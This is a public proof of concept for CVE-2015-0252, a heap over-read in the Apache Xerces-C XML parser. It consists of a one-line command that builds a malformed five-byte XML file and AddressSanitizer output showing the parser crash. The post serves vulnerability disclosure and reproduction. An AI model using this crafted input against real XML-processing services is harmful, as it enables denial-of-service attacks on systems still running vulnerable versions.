@@ -1,0 +1,82 @@
+# Exploit Title: Apache Xerces-C XML Parser (< 3.1.2) DoS POC
+# Date: 2015-05-03
+# Exploit Author: beford
+# Vendor Homepage: http://xerces.apache.org/#xerces-c
+# Version: Versions prior to 3.1.2
+# Tested on: Ubuntu 15.04
+# CVE : CVE-2015-0252
+
+Apache Xerces-C XML Parser Crashes on Malformed Input
+
+I believe this to be the same issue that was reported on CVE-2015-0252,
+posting this in case anyone is interested in reproducing it.
+
+Original advisory:
+https://xerces.apache.org/xerces-c/secadv/CVE-2015-0252.txt
+
+$ printf "\xff\xfe\x00\x00\x3c" > file.xml
+
+$ DOMPrint ./file.xml   # Ubuntu 15.04 libxerces-c3.1 package
+Segmentation fault
+
+$ ./DOMPrint ./file.xml # ASAN Enabled build
+=================================================================
+==6831==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xb5d9d87c
+at pc 0x836a721 bp 0xbf8127a8 sp 0xbf812798
+READ of size 1 at 0xb5d9d87c thread T0
+    #0 0x836a720 in xercesc_3_1::XMLReader::refreshRawBuffer()
+xercesc/internal/XMLReader.cpp:1719
+    #1 0x836a720 in xercesc_3_1::XMLReader::xcodeMoreChars(unsigned short*,
+unsigned char*, unsigned int) xercesc/internal/XMLReader.cpp:1761
+    #2 0x837183f in xercesc_3_1::XMLReader::refreshCharBuffer()
+xercesc/internal/XMLReader.cpp:576
+    #3 0x837183f in xercesc_3_1::XMLReader::peekString(unsigned short
+const*) xercesc/internal/XMLReader.cpp:1223
+    #4 0x83ad0ae in xercesc_3_1::ReaderMgr::peekString(unsigned short
+const*) xercesc/internal/ReaderMgr.hpp:385
+    #5 0x83ad0ae in xercesc_3_1::XMLScanner::checkXMLDecl(bool)
+xercesc/internal/XMLScanner.cpp:1608
+    #6 0x83b6469 in xercesc_3_1::XMLScanner::scanProlog()
+xercesc/internal/XMLScanner.cpp:1244
+    #7 0x8d69220 in
+xercesc_3_1::IGXMLScanner::scanDocument(xercesc_3_1::InputSource const&)
+xercesc/internal/IGXMLScanner.cpp:206
+    #8 0x83cd3e7 in xercesc_3_1::XMLScanner::scanDocument(unsigned short
+const*) xercesc/internal/XMLScanner.cpp:400
+    #9 0x83ce728 in xercesc_3_1::XMLScanner::scanDocument(char const*)
+xercesc/internal/XMLScanner.cpp:408
+    #10 0x849afc5 in xercesc_3_1::AbstractDOMParser::parse(char const*)
+xercesc/parsers/AbstractDOMParser.cpp:601
+    #11 0x8050bf2 in main src/DOMPrint/DOMPrint.cpp:398
+    #12 0xb6f5272d in __libc_start_main
+(/lib/i386-linux-gnu/libc.so.6+0x1872d)
+    #13 0x805d3b5 (/ramdisk/DOMPrint+0x805d3b5)
+
+0xb5d9d87c is located 0 bytes to the right of 163964-byte region
+[0xb5d75800,0xb5d9d87c)
+allocated by thread T0 here:
+    #0 0xb72c3ae4 in operator new(unsigned int)
+(/usr/lib/i386-linux-gnu/libasan.so.1+0x51ae4)
+    #1 0x8340cce in xercesc_3_1::MemoryManagerImpl::allocate(unsigned int)
+xercesc/internal/MemoryManagerImpl.cpp:40
+    #2 0x8094cb2 in xercesc_3_1::XMemory::operator new(unsigned int,
+xercesc_3_1::MemoryManager*) xercesc/util/XMemory.cpp:68
+    #3 0x8daaaa7 in
+xercesc_3_1::IGXMLScanner::scanReset(xercesc_3_1::InputSource const&)
+xercesc/internal/IGXMLScanner2.cpp:1284
+    #4 0x8d6912a in
+xercesc_3_1::IGXMLScanner::scanDocument(xercesc_3_1::InputSource const&)
+xercesc/internal/IGXMLScanner.cpp:198
+    #5 0x83cd3e7 in xercesc_3_1::XMLScanner::scanDocument(unsigned short
+const*) xercesc/internal/XMLScanner.cpp:400
+    #6 0x83ce728 in xercesc_3_1::XMLScanner::scanDocument(char const*)
+xercesc/internal/XMLScanner.cpp:408
+    #7 0x849afc5 in xercesc_3_1::AbstractDOMParser::parse(char const*)
+xercesc/parsers/AbstractDOMParser.cpp:601
+    #8 0x8050bf2 in main src/DOMPrint/DOMPrint.cpp:398
+    #9 0xb6f5272d in __libc_start_main
+(/lib/i386-linux-gnu/libc.so.6+0x1872d)
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow
+xercesc/internal/XMLReader.cpp:1719
+xercesc_3_1::XMLReader::refreshRawBuffer()
